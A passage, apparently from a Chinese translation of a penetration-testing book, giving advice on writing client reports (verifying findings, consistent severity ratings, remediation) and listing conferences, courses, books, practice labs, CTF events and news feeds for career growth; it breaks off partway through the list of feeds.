  \n如果你想看看示例报告应该是什么样子的，可以参考 Offensive Security 的样本报告。 [`www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf`](http://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf)\n\
  \n![样本报告参考](img/00251.jpeg)\n\n### 关键报告指南\n\n#### 不要提交扫描器报告\n*   不要提交重新命名过的 Nexpose\
  \ 或 Nessus 报告。\n    *   我再怎么强调都不为过；请使用你自己的模板并验证你的发现。\n    *   绝不要将 Nexpose 或 Nessus\
  \ 报告作为最终报告交给客户。\n\n#### 统一漏洞评级标准\n*   对漏洞进行评级。\n    *   确保你找到一种方法来统一对漏洞进行评级。\n \
  \   *   我建立了自己的矩阵，其中包含来自 NIST、DISA、CVSS 和个人经验的参考，用于设定漏洞评级。\n    *   该矩阵包括根据内部/外部发现、是否有可用漏洞利用代码、其系统的普及程度、漏洞利用可能导致的后果以及对\
  \ CIA 安全三要素的影响来增加或降低严重程度。\n    *   经过我矩阵评估的漏洞将始终具有相同的严重性级别。如果客户询问我如何对漏洞进行评分，我可以引用我的矩阵。\n\
  \n#### 理论发现与实际发现\n*   理论发现与实际发现。\n    *   我通常不喜欢将发现标记为关键，如果它们只是理论上的，且没有已知的实际漏洞利用方式。这些肯定仍应作为发现报告，但如果我找不到任何攻击主机的途径，我通常会降低其评级。\n\
  \    *   这有助于客户正确识别哪些发现需要立即关注，哪些可以在常规变更控制窗口期间处理。\n\n#### 解决方案至关重要\n*   解决方案与发现同等重要。\n\
  \    *   如果你使用工具攻破网络，你必须有办法阻止它。\n    *   如果你没有解决方案，帮助客户制定缓解策略。\n\n#### 准确评估 Secure\
  \ Flag/HTTP Only 发现\n*   如果 Secure Flag/HTTP Only 发现不构成问题，请勿错误评级。\n    *   有些 Cookie\
  \ 不用于会话令牌，可能不会为攻击者提供任何额外的攻击面。虽然这些仍应报告，但其评级应远低于用于跟踪会话状态的 Cookie。\n    *   这只是一个例子，旨在强调确保正确理解漏洞的理念。\n\
  \n#### 验证发现\n*   确保漏洞是真实的漏洞。\n    *   我收到过多少次渗透测试结果，告诉我我的系统上有 PHP 漏洞利用。这是因为扫描器仅基于版本就提醒他们存在这些关键发现。一些发现称是\
  \ PHP CGI 问题或 Apache mod security 问题。问题在于我的服务器并不运行 CGI 脚本，但扫描器仅基于版本就识别出了该问题。请务必确保验证发现是真实的发现。\n\
  \n\n\n\n\n## 客户反馈与持续成长指南\n\n### 客户反馈\n\n本节最后要强调的是确保从客户那里获取反馈。图表适合管理层查看，但技术人员希望看到大量重现漏洞利用的步骤和程序。同时，将所有原始扫描结果、原始\
  \ Burp 结果移交给客户也很重要，我通常还会提供一个 Excel 文件，其中包含发现的漏洞和漏洞的简单列表。Excel 文件使 IT 团队能够轻松勾选哪些发现已修复，哪些仍然有效。\n\
  \n如果你想在渗透测试人员中脱颖而出，尝试寻找方法将自己与其他人区分开来。如果你为大公司做渗透测试，还可以提供一份简单的 OSINT（开源情报）报告，描述从互联网上可以公开发现什么和谁。\n\
  \n![](img/00252.jpeg)\n\n### 持续成长路径\n\n最常被问到的问题之一是“接下来该去哪里？”如何在安全行业持续变强，如何提升？所以我尝试为读者提供一份选项清单。我将这部分细分为：主要参会会议、辅助成长的培训课程、技术与非技术书籍阅读、靶场框架、夺旗赛（CTF）活动，以及跟进新闻资讯。\n\
  \n![](img/00253.jpeg)\n\n#### 主要安全会议\n\n我从参加主要安全会议开始，因为这是结识他人、了解行业动态的绝佳场所。参会选择非常多，你可以在\
  \ InfoSecEvents 找到更完整的列表：[`bit.ly/1cVISnz.I’ll`](http://bit.ly/1cVISnz.I’ll)。以下是我亲身经历推荐的会议及简介：\n\
  \n*   **DefCon** ([`www.defcon.org/`](http://www.defcon.org/)) - 拉斯维加斯举办，费用低于 $200。这是最大的黑客大会，必参加。\n\
  *   **DerbyCon** ([`www.derbycon.com/`](http://www.derbycon.com/)) - 肯塔基州举办，费用低于\
  \ $200。我最喜欢的部分演讲来自 DerbyCon。\n*   **BlackHat** ([`www.blackhat.com/`](http://www.blackhat.com/))\
  \ - 拉斯维加斯举办，费用极高。演讲嘉宾阵容强大，更面向企业员工。\n*   **Bsides** ([`www.securitybsides.com/`](http://www.securitybsides.com/))\
  \ - 通常免费。全国各地都有 Bsides 大会，找到你附近的那场！\n*   **ToorCon** ([`toorcon.net/`](http://toorcon.net/))\
  \ - 圣地亚哥举办，这是小型会议之一，能结识很多新朋友，大家都很友好。\n*   **CanSec** ([`cansecwest.com/`](http://cansecwest.com/))\
  \ - 我只参加过 CanSecWest，价格不菲，但技术演讲质量一直很高。\n*   **Shmoocon** ([`www.shmoocon.org/`](http://www.shmoocon.org/))\
  \ - 东海岸最大的会议之一，费用低于 $200。我最喜欢的会议之一。\n*   **OWASP AppSec** ([`www.owasp.org/index.php/Category:OWASP_AppSec_Conference`](http://www.owasp.org/index.php/Category:OWASP_AppSec_Conference))\
  \ - 价格低廉且有趣，专注于 Web 应用安全。如果你是 OWASP 会员，费用低于 $100。\n*   **Lethal** ([`www.meetup.com/LETHAL/`](http://www.meetup.com/LETHAL/))\
  \ - 当然要推荐一下我的小组。虽然不是会议，但我们有每月聚会并邀请演讲者。不仅免费，而且小组规模小，方便你参与并结识志同道合的人。\n\n![](img/00254.jpeg)\n\
  \n#### 培训课程\n\n如果你想在某个安全领域快速入门，培训课程最有帮助。鉴于课程众多，以下是一些推荐：\n\n*   **BlackHat** - 费用极高，但不仅课程种类多，而且由业内顶尖专家授课。\n\
  *   **DerbyCon** - 肯塔基州举办，价格合理，在会议期间进行。\n*   **SANS** ([`www.sans.org`](http://www.sans.org))\
  \ - 费用极高，但它们是行业标准。\n*   **Offensive Security** ([`www.offensive-security.com/`](http://www.offensive-security.com/))\
  \ - 价格合理，我强烈推荐参加 Offensive Security 的在线课程。你将获得大量实战经验，但需要投入大量时间。\n\n![](img/00255.jpeg)\n\
  \n#### 书籍推荐\n\n还有许多好书值得一读。我无法列出所有，但以下这些令我印象深刻——顺序不分先后。你可能会问，为什么要关注恶意软件分析这类书籍？简单的答案是：不同安全领域（取证、恶意软件分析、应急响应、渗透测试）相互交织。要成为优秀的渗透测试员，你必须了解它们。你得知道如何清除痕迹、什么可能阻止你攻破目标、以及防御者是如何思考的。\n\
  \n##### 技术类阅读\n\n*   《Web Application Hacker’s Handbook 2》\n*   《Metasploit The\
  \ Penetration Tester’s Guide》\n*   《Gray Hat Hacking》\n*   《SQL Injection: Attack\
  \ and Defense》\n*   《Hacking: The Art of Exploitation》\n*   《Hacking Exposed》（全系列）\n\
  *   《Malware Analyst Cookbook》\n*   《Shellcoder’s Handbook 2nd Edition》\n*   《A\
  \ Bug Hunter’s Diary》\n\n##### 趣味安全相关阅读\n\n*   《Enders game》\n*   《Cryptonomicon》\n\
  *   《Snow Crash》\n*   《The Cuckoo’s Egg》\n*   《How to Steal a Network》（全系列）\n* \
  \  《Dissecting the hack: the f0rb1dd3n network》\n*   《Silence on the wire》\n*  \
  \ 《Underground》\n*   《Daniel Suarez’s Daemon》\n*   《Kingpin》\n\n![](img/00256.jpeg)\n\
  \n#### 靶场框架实战\n\n想自学变强？虽然我没试过所有这些框架，但你可以下载、部署它们，然后告诉我体验如何。这是极佳的练习！\n\n*   Offensive\
  \ Security Metasploitable\n*   OWASP WebGoat/Vicnum/InsecureWebApp\n*   Maven Security\
  \ WebMaven/Buggy Bank\n*   Google Gruyere (antigo Codelab / Jalsberg)\n*   NTNU\
  \ Hacme Game\n*   SPI Dynamics SPI Dynamics\n*   DVWA Damn Vulnerable Web Application\n\
  *   Iron Geek Mutillidae\n*   The Butterfly Security The Butterfly Security Project\n\
  *   McAfee Hacme Casino/HacmeBank/Travel/Shipping\n*   Bonsai Sec Moth\n*   Stanford\
  \ SecuriBench\n*   Enigma Group EnigmaGroup\n*   X5S XSS Encoding Skills\n*   The\
  \ Bodgeit Store\n*   MadIrish LampSecurity\n*   WackoPicko\n*   DVL Damn Vulnerable\
  \ Linux\n*   Pynstrom Holynix\n\n![](img/00257.jpeg)\n\n#### 夺旗赛（CTF）挑战\n\n如果你打算以此为职业，甚至只是出于兴趣，你真的需要参与不同的\
  \ CTF 挑战。试着找几个朋友，或者找到你当地的安全小组一起尝试这些挑战。这不仅能测试你的技能和对攻击的理解，还能让你更好地与业内人士建立联系。花 3 天 3\
  \ 夜攻克挑战，大概是你能体验到的最有成就感的事情之一。\n\n访问 [`ctftime.org/`](http://ctftime.org/) 查找下一场 CTF\
  \ 的时间地点。如果你在洛杉矶地区，欢迎访问 [www.meetup.com/lethal](http://www.meetup.com/lethal) 加入我们的战队！\n\
  \n![](img/00258.jpeg)\n\n#### 安全资讯跟进\n\n安全领域变化迅速，跟上这个不断演变的世界至关重要。以下是我每天早上都会查看的 RSS\
  \ 订阅/网站列表，以及我每天接收的邮件列表。\n\n##### RSS Feed / 网站列表\n\n*   [`securepla.net/rss.php`](http://securepla.net/rss.php)\
  \ - 这是我多年整理的个人 RSS 订阅源，强烈推荐查看。\n*   [`code.google.com/p/pentest-bookmarks/wiki/BookmarksList`](https://code.google.com/p/pentest-bookmarks/wiki/BookmarksList)\n\
